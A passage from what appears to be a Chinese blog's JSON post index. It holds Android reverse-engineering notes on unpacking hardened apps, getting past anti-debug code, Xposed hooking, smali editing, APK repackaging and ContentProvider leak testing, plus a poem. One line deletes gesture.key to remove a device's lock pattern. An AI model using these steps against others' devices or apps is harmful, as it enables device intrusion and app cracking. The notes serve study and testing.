启动Activity时不设置intent的FLAG_ACTIVITY_NEW_TASK标签。\n","tags":["anroid安全"],"categories":["android安全"]},{"title":"android加固","url":"/post/3671652172.html","content":"\n## app加固威胁\n\n- 代码修改(广告植入、替换广告id)\n- 资源修改(界面替换广告，链接替换)\n- 破解(应用收费，内购)\n- 篡改数据(无限金币,钻石)\n- 加入恶意代码(木马，隐私，交易)\n- 动态注入，数据拦截，窃取，修改；协议修改\n\n## app加固的目的\n\n- 保护核心代码，防止被逆向，泄密 防止逆向分析-防止核心代码被反编译\n- 防止营销作弊\n- 防止代码被修改\n- 控制被二次打包-校验完整性，签名，防止盗版\n- 防止调试和注入-防止动态调试，注入获取关键数据\n- 防止应用数据窃取-加密敏感数据\n- 防止协议直接被盗刷-加密协议通信\n\n## 加固技术的发展历史\n\n- 第一代 DEX加密、字符串加密、资源加密、反调试、自定义DexClassLoader \n- 第二代 核心封装到So库/方法抽取/反调试\n- 第三代 ELF变形/Ollvm混淆/多进程保护\n- 第四代 代码虚拟化保护 DEX虚拟化保护\n- 第五代 ARM虚拟化保护\n\n## 常见加固厂商\n\n- 加固保360\n\n[360加固保](http://jiagu.360.cn/#/global/index)\n\n- 娜迦nagapt\n\n[娜迦加固](http://www.nagain.com/)  \n\n- 梆梆bangcle\n\n[梆梆加固](https://www.bangcle.com/)\n\n- 爱加密ijm\n\n[爱加密加固](http://www.ijiami.cn/appprotect_encrypt_way)\n\n- 阿里\n- 百度，盛大，腾讯，网秦，通付盾\n\n## 常见加固方式\n\n类加载技术：  \n针对apk中的classes.dex文件进行处理，放入待定的文件中，通过native代码来进行对其运行时解密。  \n\n使用厂商：娜迦，爱加密，梆梆等。  \n\n方法替换技术：  \n将classes.dex中的方法中代码进行提取，抽取方法，在运行时对其动态进行解密还原  \n\n梆梆，娜迦  \n\n## 常用加固厂商特征\n\n- 娜迦 libchaosvmp.so,libddog.so libfdog.so\n- 爱加密 libexec.so,libexecmain.so\n- 梆梆 libsecexe.so libsecmain.so libDexHelper.so\n- 360 libprotectClass.so libjiagu.so\n- 通付盾 libegis.so\n- 网秦 libnqshield.so\n- 百度 libbaiduprotect.so\n\n## 脱壳的手法\n\n- 修改系统源码自动脱壳\n- 通过hook方式对关键函数进行脱壳\n- 开源工具入ZjDroid，DexHunter进行脱壳\n- 利用IDA或者GDB动态调试进行脱壳\n\n## 反调试\n\n反调试代码，都是在壳子的so中执行的，那么，我们只要在进入壳子第一行代码时下了断点，在调试过程中，找到了反调试检测代码的位置，直接干掉，直接绕过反调试  \n\n在libdvm.so中方法loadNativeCode处下断点，android系统加载加载native代码也就是so文件都要走的函数，所以下在这里的断点，能够有效的找到加载壳子的so位置，能够在一进入壳子的so，直接断住。  \n\n最简单的技巧，就是单步调试，F8一路按下去，按的多了，就有了更好的位置下断点。  \n\n记住一点就好，壳子的so中，总有一处是解密还原出app原本的dex的。  \n","tags":["android安全"],"categories":["android安全"]},{"title":"android busybox","url":"/post/1663513283.html","content":"\n# 安装busybox\n> 手机要root\n\n## 查看对应arm\n\tadb shell getprop ro.product.cpu.abi\n\t> arm64-v8a\n\n## 下载busybox\n\n下载最新版本下，对应的arm\n[busybox download](http://www.busybox.net/downloads/binaries)  \n修改名称为busybox\n\n## push\n\n\tadb push busybox /sdcard\n\n## 修改/system 目录可读写\n\n\tadb shell\n\tsu\n\tmount -o remount,rw -t yaffs2 /dev/block/mtdblock3 /system\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/28/01.png)\n\n\tadb shell \n\tsu\n\t> su\n\tmount -o rw,remount -t yaffs2 /system\n\t> mount -o rw,remount -t yaffs2 /system\n\tmount -o rw,remount -t yaffs2 /system\n\t> mount -o rw,remount -t yaffs2 /system\n\tmount -o rw,remount -t yaffs2 /system\n\t> mount -0 rw,remount -t yaffs2 /system\n\n\tadb remount\n\t>remount succeeded\n\n## copy\n\tcp /sdcard/busybox /system/xbin\n\tchmod 755 busybox\n\n\tcd /system/xbin\n\tbusybox --install .\n\n## LINKS\n\n[在Android上安装BusyBox](https://blog.csdn.net/hp910315/article/details/79510223)  \n[android安装busybox](https://www.cnblogs.com/shamoguzhou/p/6233407.html)  \n","tags":["android逆向"],"categories":["android逆向"]},{"title":"《船》","url":"/post/1801016912.html","content":"\n\t《船》\n\t我有过多次这样的奇遇，\n\n\t从天堂到地狱只在瞬息之间：\n\n\t每一朵可爱、温柔的浪花\n\n\t都成了突然崛起、随即倾倒的高山。\n\n\n\n\t每一滴海水都变脸色，\n\n\t刚刚还是那样的美丽、蔚蓝；\n\n\t旋涡纠缠着旋涡，\n\n\t我被抛向高空又投进深渊……\n\n\n\n\t当时我甚至想到过轻生，\n\n\t眼前一片苦海无边；\n\n\t放弃了希望就像放弃了舵柄，\n\n\t在暴力之下只能沉默和哀叹。\n\n\n\n\t今天我才有资格嘲笑昨天的自己，\n\n\t为昨天落叶似的惶恐感到羞惭；\n\n\t虚度了多少年华，\n\n\t船身多次被礁石撞穿……\n\n\n\n\t千万次在大洋里撒网，\n\n\t才捕获到一点点生活的经验，\n\n\t才恍然大悟，\n\n\t啊！道理原是如此浅显；\n\n\n\n\t你要航行吗?\n\n\t必然会有千妖百怪出来阻拦；\n\n\t暴虐的欺凌是它们的游戏，\n\n\t制造灭亡是它们唯一的才干。\n\n\n\n\t命中注定我要常常和它们相逢，\n\n\t因为我的名字叫做船；\n\n\t面对强大于自身千万倍的对手，\n\n\t能援救自己的只有清醒和勇敢。\n\n\n\n\t恐惧只能使自己盲目，\n\n\t盲目只能夸大魔鬼的狰狞嘴脸；\n\n\t也许我的样子比它们更可怕，\n\n\t当我以命相拼，一往无前！\n\n\n\n\t只要我还有一根完整的龙骨，\n\n\t绝不驶进避风的港湾；\n\n\t把生命放在征途上，\n\n\t让勇敢来决定道路的宽窄、长短。\n\n\n\n\t我完完全全的自由了，\n\n\t船头成为埋葬它们的铁铲；\n\n\t我在波浪中有节奏地跳跃，\n\n\t就像荡着一个巨大的秋千。\n\n\n\n\t即使它们终于把我撕碎，\n\n\t变成一些残破的木片，\n\n\t我不会沉沦，决不！\n\n\t我还会在浪尖上飞旋。\n\n\n\n\t后来者还会在残片上认出我，\n\n\t未来的诗人会唱然长叹：\n\n\t“这里有一个幸福的灵魂，\n\n\t它曾经是一艘前进着的航船……”","tags":["biu"],"categories":["biu"]},{"title":"android VitualXposed 模块编写","url":"/post/4010998048.html","content":"\n## virtual Xposed\n[virtual Xposed下载链接: ](https://pan.baidu.com/s/1GHoOGm7DuBtkL9AgsaJvNA)\n提取码: kyrd    \n\n[virtual xposed wiki](https://github.com/android-hacker/VirtualXposed/wiki/Utilities-For-Xposed-Module-Developer)  \n\n\n## vx的一些命令\n    \n    adb shell am start io.va.exposed/io.virtualapp.splash.SplashActivity 启动\n    adb shell am broadcast -a io.va.exposed.CMD -e cmd reboot 重启\n    adb shell am broadcast -a io.va.exposed.CMD -e cmd update -e pkg <package-name> 安装更新app\n    adb shell am broadcast -a io.va.exposed.CMD -e cmd launch -e pkg <package-name> 启动内部app\n\n## 编写Xposed模块\n\n1.xposed依赖  \n[xposed](https://jcenter.bintray.com/de/robv/android/xposed/api/)  \n\nbuild.gradle中添加  \n\n```\ncompileOnly 'de.robv.android.xposed:api:82'\ncompileOnly 'de.robv.android.xposed:api:82:sources'\n```\n\n2.AndroidManifest.xml添加Xposed模块  \n\n```\n<application>\n\t<meta-data\n        android:name=\"xposedmodule\"\n        android:value=\"true\" />\n    <meta-data\n        android:name=\"xposeddescription\"\n        android:value=\"this is a xposed demo\" />\n    <meta-data\n        android:name=\"xposedminversion\"\n        android:value=\"30\" />\n</application>\n```\n\n3.新建个项目为被hook  \n\nMainActivity.java  \n```\npublic class MainActivity extends AppCompatActivity {\n\n    private Button btn;\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n        btn = findViewById(R.id.btn);\n        btn.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View view) {\n                Toast.makeText(MainActivity.this, toastMessage(), Toast.LENGTH_SHORT).show();\n            }\n        });\n    }\n    public String toastMessage() {\n        return \"我没有被劫持\";\n    }\n}\n```\nactivity_main.xml  \n\n```\n<android.support.constraint.ConstraintLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n    xmlns:tools=\"http://schemas.android.com/tools\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\"\n    tools:context=\".MainActivity\">\n    <Button\n        android:id=\"@+id/btn\"\n        app:layout_constraintLeft_toLeftOf=\"parent\"\n        app:layout_constraintTop_toTopOf=\"parent\"\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"wrap_content\"\n        android:text=\"btn\"/>\n\n</android.support.constraint.ConstraintLayout>\n\n```\n打包安装到VirtualXposed  \n\n4.编写hook类   \n[XposedHelpers api](https://api.xposed.info/reference/de/robv/android/xposed/XposedHelpers.html)  \n\n```\npublic class HookToast implements IXposedHookLoadPackage {\n    @Override\n    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {\n        if (lpparam.packageName.equals(\"com.demo.myapplication\")){\n            Class clazz = lpparam.classLoader.loadClass(\"com.demo.myapplication.MainActivity\");\n            XposedHelpers.findAndHookMethod(clazz, \"toastMessage\", new XC_MethodHook() {\n                @Override\n                protected void beforeHookedMethod(MethodHookParam param) throws Throwable { //hook之前\n//                    super.beforeHookedMethod(param);\n                    XposedBridge.log(\"you are been hooked\"); \n                }\n\n                @Override\n                protected void afterHookedMethod(MethodHookParam param) throws Throwable { // hook之后\n//                    super.afterHookedMethod(param);\n                    param.setResult(\"hacked by tea\"); //改变返回结果 \n                }\n            });\n        }\n    }\n}\n```\n\n\n\n\n\t新建app/assets文件夹\n\t新建xposed_init文件\n\t添加\n\tcom.demo.android_hook.HookToast //修改成你的hook类\n\n\t然后打包测试\n\napp/assets/xposed_init  \n\n    com.demo.android_hook.HookToast\n\n\n![最后效果](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/27/01.jpg)  \n\n## LINKS\n\n[Magisk框架，VirtualXposed框架，Xposed框架比较](https://blog.csdn.net/ZhangChengHai/article/details/82950334)  \n[AlipayQRHook](https://github.com/wayu002/AlipayQRHook)  \n[Xposed 模块免重启开发(借助VirtualXposed)](https://www.jianshu.com/p/938e8c4c00df)  \n[【Xposed模块开发入门】真·第一课](https://www.52pojie.cn/thread-688466-1-1.html)  \n[XPosed插件自动生成支付宝收款二维码](https://www.52pojie.cn/thread-821871-1-1.html)  \n[Android支付宝蚂蚁森林能量自动收取插件开发原理解析](https://www.52pojie.cn/forum.php?mod=viewthread&tid=794312&extra=page%3D1%26filter%3Ddigest%26digest%3D1)  \n[关于如何使用xposed来hook某支付软件](https://blog.csdn.net/ryan168/article/details/82462821)  \n[Android逆向之旅---破解某支付软件防Xposed的hook功能检测机制过程分析](https://blog.csdn.net/jiangwei0910410003/article/details/80037971)  \n[xposed检测原理分析 -案例某付宝、某音](https://blog.csdn.net/ly_xiamu/article/details/81940896)  \n[Xposed 模块免重启开发(借助VirtualXposed)](https://www.jianshu.com/p/938e8c4c00df)  \n[Android Hook框架Xposed详解：从源代码分析到开发指南](https://blog.csdn.net/zhangmiaoping23/article/details/53365780)  \n[VirtualXposed](https://blog.csdn.net/zhangmiaoping23/article/details/80432276)  ","tags":["android逆向","xposed"],"categories":["android逆向"]},{"title":"smali hello","url":"/post/229799766.html","content":"\n## smali语法\n\n\tinvoke-static 是类静态方法的调用，编译时，静态确定的；\n\tinvoke-virtual 虚方法调用，调用的方法运行时确认实际调用，和实例引用的实际对象有关，动态确认的，一般是带有修饰符protected或public的方法；\n\tinvoke-direct 没有被覆盖方法的调用，即不用动态根据实例所引用的调用，编译时，静态确认的，一般是private或<init>方法；\n\tinvoke-super 直接调用父类的虚方法，编译时，静态确认的。\n\tinvokeinterface 调用接口方法，调用的方法运行时确认实际调用，即会在运行时才确定一个实现此接口的对象。\n\n---\n\n\t.class public LHelloWorld; #定义类名\n\t.super Ljava/lang/Object; #定义父类\n\t.method public static main(Ljava/lang/String;)V #声明静态main()方法\n\t\t.registers 4 #程序中使用v0、v1、v2寄存器与一个蚕食寄存器\n\t\t.parameter\t#一个参数\n\t\t.prologue #代码起始指令\n\t\t#空指令\n\t\tnop\n\t\tnop\n\t\tnop\n\t\tnop\n\t\t#数据定义指令\n\t\tconst/16 v0, 0x8\n\t\tconst/4 v1, 0x5\n\t\tconst/4 v2, 0x3\n\t\t#数据操作指令\n\t\tmove v1, v2\n\t\t#数组操作指令\n\t\tnew-array v0,v0,[I\n\t\tarray-length v1,v0\n\t\t#实例操作指令\n\t\tnew-instance v1, Ljava/lang/StringBuilder;\n\t\t#方法调用指令\n\t\tinvoke-direct {v1},Ljava/lang/StringBuilder;-><init>()V\n\t\t#跳转指令\n\t\tif-nez v0,:cond_0\n\t\tgoto :goto_0\n\t\t:cond_0\n\t\t#数据转换指令\n\t\tint-to-float v2,v2\n\t\t#数据运算指令\n\t\tadd-float v2,v2,v2\n\t\t#比较指令\n\t\tcmpl-float v0,v2,v2\n\t\t#字段操作指令\n\t\tsget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;\n\t\tconst-string v1,\"Hello World\"\n\t\t#方法调用指令\n\t\tinvoke-virtual {v0,v1},Ljava/io/PrintStream;->println(Ljava/lang/String;)V\n\t\t#返回指令\n\t\t:goto_0\n\t\treturn-void #返回空\n\t.end method\n\n\n## smali动态调试-android studio\n\n---\n\n[Android Studio动态调试smali源码](https://blog.csdn.net/hp910315/article/details/52790740)  \n[androidstudio动态调试smali](https://blog.csdn.net/shengerjianku/article/details/76511898)  \n\n[AS动态调试smali](https://blog.csdn.net/hujiuding/article/details/79057705)  \n\n[smali.jar download](https://bitbucket.org/JesusFreke/smali/downloads/)  \n\n01. android studiao  Plugins Install plugin from disk  smalidea\n\t[smalidea](https://bitbucket.org/JesusFreke/smali/downloads/smalidea-0.05.zip)  \n\n02. 反编译apk，修改AndroidManifest.xml中的debug属性 或者 使用mprop工具 或者 xposed xinstaller 模块（没试过）\n\t[android反编译一个app/签名](https://tea9.xyz/2019/01/07/android_reverse_app.html)  \n\t[利用mprop工具修改当前手机应用都可以调试](https://www.jianshu.com/p/e540f34cec07)  \n```\n\t安装xposed框架（需要root，刷第三方recovery），之后安装xinstaller模块，设置xinstaller启动专家模式，在其他设置中开启“调试应用”\n```\n\n使用mprop。\n```\n\tcd mprop/libs\n\tadb push armeabi-v7a/mprop /data/local/tmp\n\n\tadb shell\n\t\tsu\n\t\tchmod 755 /data/local/tmp/mprop  \n\t\tdata/local/tmp/mprop\n\t\tsetprop ro.debuggable 1\n\t\tdata/local/tmp/mprop -r\n```\n\n\tcat default.prop\n\n\tro.secure=1\n\tsecurity.perf_harden=1\n\tro.allow.mock.location=0\n\tro.debuggable=1\n\tpersist.sys.usb.config=adb\n\n\n03. 动态调试\n\n```\n\tjava -jar baksmali-2.0.8.jar test_signed.apk -o ~/Downloads/SmaliDebug/src\n\n\tadb install xx.apk //安装重新打包的apk\n\n\tadb shell dumpsys window w |grep \\/ |grep name= // 查看顶层activity\n\n\tadb shell am start -D -n com.example.simpleencryption/.MainActivity // 以调试模式打开\n\tadb shell am start -D -n com.hypay.pay.pkg/com.sytpay.paytimework.LoginActivity\n\n\tadb shell ps|grep <package-name> //查看端口号\n\n\tadb forward tcp:8700 jdwp:1924 //转发\n\n下断点\nRun-Debug\n```\n\n## ERROR\n\nError running 'DebugSmali': Unable to open debugger port (localhost:8700): java.net.ConnectException \"Connection refused (Connection refused)\"  \n\n\tadb kill-server //kill adb服务\n\tadb start-server\n\n\tsudo lsof -i tcp:8700 //查看8700端口占用\n\tnetstat -nao | findstr <port>\n\tkill -9 8348 //kill掉进程\n\n\t把DDMS关掉 DDMS会占用8700端口\n\t重起AndroidStudio\n\n## Smali 2 Java\n[download链接: ](https://pan.baidu.com/s/1kh8qJOypIo_1Lse-AazmRg)   \n提取码: ix9u \n\n## Java 2 Smali\n\n[intellij-java2smali](https://github.com/ollide/intellij-java2smali)  \n\nPreferences->Plugins->smali\n\nUse:\n\nBuild->Compile to smali\n\n---\n[如何把java代码转换成smali代码](https://www.cnblogs.com/gordon0918/p/5466514.html)  \n\n\tjavac smaliTest.java\n\tjava -jar dx.jar --dex --output=smaliTest.dex smaliTest.class //android-sdk\\build-tools\\23.0.1\\lib\n\tjava -jar baksmali.jar smaliTest.dex //android-sdk\\platform-tools\\\n\n\tout目录，里面有我们的smali文件\n\n## 写一个demo 修改smali **\n\n## startActivity\n\n\t.method protected onCreate(Landroid/os/Bundle;)V\n\t    .registers 4\n\t    .param p1, \"savedInstanceState\"    # Landroid/os/Bundle;\n\n\t    .prologue\n\t    .line 11\n\t    invoke-super {p0, p1}, Landroid/support/v7/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V\n\n\t    .line 13\n\t    new-instance v0, Landroid/content/Intent;\n\n\t    const-class v1, Lcom/demo/myapplication/MainActivity;\n\n\t    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n\n\t    .line 14\n\t    .local v0, \"intent\":Landroid/content/Intent;\n\t    invoke-virtual {p0, v0}, Lcom/demo/myapplication/MainActivity;->startActivity(Landroid/content/Intent;)V\n\n\t    .line 15\n\t    return-void\n\t.end method\n\n---\n\n## 启动一个活动\n    new-instance v0, Landroid/content/Intent;\n\n    invoke-virtual {p0}, Lcom/demo/myapplication/App;->getApplicationContext()Landroid/content/Context;\n\n    move-result-object v1\n\n    const-class v2, Lcom/demo/myapplication/LoginActivity;\n\n    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n\n    invoke-virtual {p0, v0}, Lcom/demo/myapplication/App;->startActivity(Landroid/content/Intent;)V\n\n---\n\n## 编译smali文件\n\nHelloWorld.smali  \n\n\t.class public LHelloWorld;#定义类名\n\t.super Ljava/lang/Object;#定义父类\n\t.method public static main([Ljava/lang/String;)V#声明静态main()方法\n\t\t.registers 4#程序使用v0、v1、v2寄存器和一个参数寄存器\n\t\t.prologue#代码起始指令\n\t\t#空指令\n\t\tnop\n\t\tnop\n\t\tnop\n\t\tnop\n\t\t#数据定义指令\n\t\tconst/16 v0, 0x8\n\t\tconst/4 v1, 0x5\n\t\tconst/4 v2, 0x3\n\t\t#数据操作指令\n\t\tmove v1, v2\n\t\t#数组操作指令\n\t\tnew-array v0, v0, [I\n\t\tarray-length v1, v0\n\t\t#实例操作指令\n\t\tnew-instance v1, Ljava/lang/StringBuilder;\n\t\t#方法调用指令\n\t\tinvoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V\n\t\t#跳转指令\n\t\tif-nez v0, :cond_0\n\t\tgoto :goto_0\n\t\t:cond_0\n\t\t#数据转换指令\n\t\tint-to-float v2, v2\n\t\t#数据运算指令\n\t\tadd-float v2, v2, v2\n\t\t#比较指令\n\t\tcmpl-float v0, v2, v2\n\t\t#字段操作指令\n\t\tsget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;\n\t\tconst-string v1, \"Hello World\" #构造字符串\n\t\t#方法调用指令\n\t\tinvoke-virtual {v0, v1},Ljava/io/PrintStream;->println(Ljava/lang/String;)V\n\t\t#返回指令\n\t\t:goto_0\n\t\treturn-void#返回空值\n\t.end method\n\n\n\tjava -jar smali-2.2.6.jar a -o HelloWorld.dex HelloWorld.smali\n\tadb push HelloWorld.dex /sdcard/\n\n\t>adb shell dalvikvm -cp /sdcard/HelloWorld.dex HelloWorld\n\tHello World\n\t\n## LINKS\n[用 Smali 手写一个可运行的 HelloWorld！！！](https://www.cnblogs.com/plokmju/p/7742759.html)  ","tags":["android逆向","smali"],"categories":["android逆向"]},{"title":"android渗透测试学习笔记","url":"/post/4027879150.html","content":"《Android渗透测试学习手册》写的学习笔记  \n\n## 工具\n\n- ProGuard 压缩、优化和混淆Java字节码的工具\n- DashO java混淆器代码保护\n\n## links\n\n[attify/lot exploitation/penetration testing](https://www.attify.com/)  \n[Drozer](https://labs.mwrinfosecurity.com/tools/drozer/)    \n[Exploit-Me漏洞](http://labs.securitycompass.com/exploit-me/)   \n\n\n## Android Debug Bridge adb\n\n\t$ adb devices //连接设备\n\n\t$ adb shell //与设备shell交互\n\n\t\tps //正在运行的进程\n\t\t\tsystem 系统拥有\n\t\t\troot 根进程\n\t\t\tradio 电话和无线电相关的进程\n\t\t\tapp_ 用户已下载的所有应用程序 正在运行\n\n\t$ adb kill-server //杀死服务器\n\t$ adb start-server //启动服务器\n\n\t$ adb shell pm list packages //pm包管理器 工具获取所有已安装的软件包列表\n\n\t$ adb shell dumpsys meminfo //获取所有应用程序及其当前内存列表\n\n\t$ adb logcat -d -f /data/local/logcats.log\n\t$ adb logcat -d -f /sdcard/xx.log // 保存logcat日志\n\t\t-d标志指定转储完整日志文件并退出\n\t\t-f标志指定写入文件而不是在终端打印\n\n### 路径\n\t\n\t二进制文件\n\t/system/bin\n\t/system/xbin\n\n\t应用数据\n\t/data/data\n\n\t\t应用程序 文件 数据库 缓存\n\t\t/data/data/xx.xx.xx # ls\n\t\tcache\n\t\tdatabases\n\t\tfiles\n\t\tlib\n\n\t安装文件\n\t/data/apk\n\n\tPlay商店应用\n\t/data/app-private\n\n\t密码锁定路径\n\tpassword.key  gesture.key\n\t/data/system\n\n\tcd /data/system\n\trm gesture.key\n\n\t组和权限\n\tplatform.xml\n\t/system/etc/permissions/\n\tcat platform.xml\n\n\tsd卡\n\t/mnt/sdcard/\n\n\tversion\n\tcat /proc/version\n\n## 命令\n\n\tandroid虚拟设备的列表\n\tandroid list avd\n\n## MonkeyRunner\n\n\tadb shell\n\t# monkey 10 //10个自动化触摸，敲击和事件来测试应用程序\n\n## Burp Suite\n\n[download](http://portswigger.net/burp/download.html)  \n\t\n\tjava -jar burp-suite.jar\n\n\t启动模拟器与bp代理\n\n\temulator -avd [name of the avd] -http-proxy 127.0.0.1:8080\n\temulator.exe -avd AttifyAVD -http-proxy 127.0.0.1:8080\n\n## APKtool\n\n[download](https://code.google.com/p/android-apktool/downloads/list)  \n\napktool安装在/usr/bin中  \n\n.dex文件转换为smali文件  \n\n[smali-wiki](https://github.com/JesusFreke/smali/wiki)  \n\n\t反编译\n\tapktool d [app-name].apk // d 标示反编译\n\t构建\n\tapktool b [decompiled folder name] [target-app-name].apk\n\n## Virtuous Ten Studio (VTS) 只能在Windows环境中运行\n[download](http://www.virtuous-ten-studio.com)  \n\n与Apktool类似功能，VTS提供一个漂亮的图形界面\n\n## dex2jar******\n\n[download](https://code.google.com/p/dex2jar)  \n\ndex2jar\n\nwin:\n\n\td2j-dex2jar.bat \"xx.apk\" dex2jar xx.apk -> xx.jar\n\nmac:\n\t\n\tsh d2j-dex2jar.sh\n\n## JD-GUI\n\n打开jar文件  \n[download](http://jd.benow.ca)  \n\n\n\n## 签名\n\n\t检查应用程序签名\n\t$ jarsigner -verify -certs -verbose testing.apk\n\n\t解压缩.apk文件 解析META-INF文件夹中出现的CERT.RSA文件的ASCII内容 以获取签名\n\n\t$unzip testing.apk\n\t$cd META-INF\n\t$openssl pkcs7 -in CERT.RSA -print_certs -inform DER -out out.cer\n\t$cat out.cer\n\n## Android启动流程\n\n\t解锁引导加载程序\n\tNexus 7\n\t$fastboot oem unlock\n\n### 创建自己的Bootloader\n\n在引导加载程序启动内核并启动init之后，它挂载Android系统运行的一些重要目录  \n\t\n\t/dev /sys /proc\n\n\tinit从配置文件init.rc和init.[device-name].rc中获取自己的配置，在某些情况下从位于相同位置的.sh文件获取自己的配置\n\n\t$ls -l | grep 'init'\n\n\t# cat init.rc\n\n\t加载时使用的属性\n\tlocation/system/build.prop\n\tsystem/build.prop\n\n\t一但所有东西被加载，init最后会加载一个称为Zygote的进程，负责以最小空间加载Dalvik虚拟机和共享库，来加快整个进程的加载速度。\n\t一旦完成整个引导过程，系统发送BOOT_COMPLETED的广播，许多应用程序可能使用称为广播接收器的Android应用程序中的组件来监听。\n\n## Android应用程序拆解\n\t\n\n- Classes.dex 文件\n- AndroidManifest.xml 文件\n- META-INF 文件夹\n- resources.arsc 文件\n- res 文件夹\n- assets 文件夹\n- lib 文件夹\n\n---\n\n\tunzip -l simple_game.apk // -l 展示压缩包内容\n\tfile simple_game.apk //查看是否是一个有效的压缩包\n\n## 审计Android应用******\n\nContentProvider(内容提供器)泄露\n\n所有ContentProvider具有唯一的统一资源标识符(URI)以便被识别和查询。  \n命名标准惯例以content://开始  \nAndroidAPI版本低于17 ContentProvider默认属性时始终导出。\n需要在AndroidManifest.xml文件检查ContentProvider  \n\n\t<provider\n\t\tandroid:name=\"com.test.example.DataProvider\"\n\t\tandroid:authorities=\"com.test.example.DataProvider\">\n\t</provider>\n\nexample:  \n\n1. 反编译apk  \n2. 查看AnroidManifest.xml文件中的ContentProvider  \n3. `grep -R 'content://'`  \n4. `adb install vulnerable-app.apk`  \n5. 创建另一个没有任何权限的app来查询ContentProvider，然后查询漏洞app的ContentProvider。  \n\t`adb shell content query --uri [URI of the content provider]`  \n\t`adb shell content query --uri content://com.xx.xx.provider.NotePad/notes`  \n\t或者使用[Drozer](https://labs.mwrinfosecurity.com/tools/drozer)在app中找到泄漏的ContentProvider  \n6. 将agent.apk安装到模拟器，.zip文件内  \n\t启动模拟器转发端口(31415)  \n\t`adb install agent.apk`  \n\t`adb forward tcp:31415 tcp:31415`  \n7. 启动app 单击 “Embedded Server(嵌入式服务器)” 没看懂  \n8. 终端启动Drozer  \n\t`drozer console connect`  \n9. 运行`app.provider.finduri`模块来查找ContentProvider  \n\t`run app.provider.finduri com.threebanana.notes`  \n10. 运行`app.provider.query`\t模块指定ContentProviderURI    \n\t`run app.provider.query conntent://com.threebanana.notes.provider.NotePad/notes --vertical`  \n\t如果Drozer能查询和显示来自ContentProvider的数据，意味着ContentProvider泄漏数据并存在漏洞  \n11. 修复漏洞在创建ContentProvider时指定参数`android:exported=false`,或者创建一些新的权限，另一个应用程序在访问供应器之前必须请求它。  \n\n## 不安全的文件存储****\n\n目录遍历或本地文件包含漏洞：读取系统文件  \n\n客户端注入攻击：sqlite注入  \n\n## pdf\n[链接](https://pan.baidu.com/s/1g7cNFyClXOeakjLQqkb49A)  \n提取码: 6jp4 ","tags":["android逆向"],"categories":["android逆向"]},{"title":"android监听list变化","url":"/post/431642663.html","content":"\n## 思路\n\n\t主要的思路就是，新建个接口定义一个onChange()方法，然后在操作list的类中，添加这个监听。\n\n## 代码\n\nTeaChangeListListener.java\n\n    public interface TeaChangeListListener {\n        public void onChange();\n    }\n\n\nTeaList.java\n\n    public class TeaList<T> {\n    \n        private TeaChangeListListener listener;\n    \n        private ArrayList<T> list;\n    \n        public TeaList() {\n            list = new ArrayList<>();\n        }\n    \n        public T get(int position) {\n            return list.get(position);\n        }\n    \n        public int size() {\n            return list.size();\n        }\n    \n        public void add(T t) {\n            list.add(t);\n            addListener();\n        }\n    \n        public void remove(T t) {\n            list.remove(t);\n            addListener();\n        }\n    \n        public void addAll(List<T> list1) {\n            list.addAll(list1);\n            addListener();\n        }\n    \n    \n        private void addListener() {\n            if (listener!=null) {\n                listener.onChange();\n            }\n        }\n    \n        public void setChangeListener(TeaChangeListListener listener1) {\n            this.listener = listener1;\n        }\n    \n    }\n\n## 测试类\n\n    public static void main(String[] args) {\n        TeaList<String> testList = new TeaList<>();\n        testList.setChangeListener(new TeaChangeListListener() {\n            @Override\n            public void onChange() {\n                System.out.println(\"监听到变化了\");\n            }\n        });\n\n        testList.add(\"tea9\");\n\t//        List<String> testList2 = new ArrayList<>();\n\t//        testList2.add(\"tea9\");\n\t//        testList2.add(\"tea10\");\n\t//        testList.addAll(testList2);\n\t//        testList.remove(\"tea9\");\n\n        for (int i = 0; i < testList.size(); i++) {\n            System.out.println(testList.get(i));\n        }\n\n    }\n\n[TeaList.java](https://github.com/tea9/android_base/blob/master/app/src/main/java/com/demo/android_base/test/TeaList.java)  \n\n## LINKS\n\n[如何在Java中添加上的ArrayList监听(How to add listener on ArrayList in java)](http://www.it1352.com/231623.html)  \n[Android中解决RecyclerView各种点击事件的方法](https://www.jb51.net/article/140578.htm)  ","tags":["android"],"categories":["android"]},{"title":"android反编译一个app/签名","url":"/post/550908605.html","content":"\n\n## apk反编译\n\t\n\t正常情况d反编译 b重新编译 xx是生成的文件夹\n\tjava -jar apktool.jar d xx.apk -o xx\n\tjava -jar apktool.jar b xx\n\n\t这个包是因为重新打包资源文件有问题 所以用-r不反编译资源文件 -f强制删除现有文件夹\n\tjava -jar apktool.jar -r -f d xx.apk -o xx \n\tjava -jar apktool.jar b xx \n\n\tapktool 参数\n\t-f 如果目标文件夹已存在，则强制删除现有文件夹（默认如果目标文件夹已存在，则解码失败）。\n\t-o 指定解码目标文件夹的名称（默认使用APK文件的名字来命名目标文件夹）。\n\t-s 不反编译dex文件，也就是说classes.dex文件会被保留（默认会将dex文件解码成smali文件）。\n\t-r 不反编译资源文件，也就是说resources.arsc文件会被保留（默认会将resources.arsc解码成具体的资源文件）。\n\n\t大体的思路就是，先看java代码，看逻辑，然后改smali代码，重新打包\n\n[smali text](https://tea9.xyz/2019/01/21/android_smali_text.html)  \n\n\t修改AndroidManifest.xml中的android:debuggable=”true”\n\t<application android:debuggable=”true”/>\n\n[signapk下载链接](https://github.com/as0ler/Android-Tools/tree/master/Autosign/Auto-Sign)  \n\n\txx文件夹dist有生成没签名的apk\n\n\t重新签名\n\tjava -jar signapk.jar testkey.x509.pem testkey.pk8 xx.apk test_signed.apk\n\n<!-- ## 动态调试apk\n\n\t调试 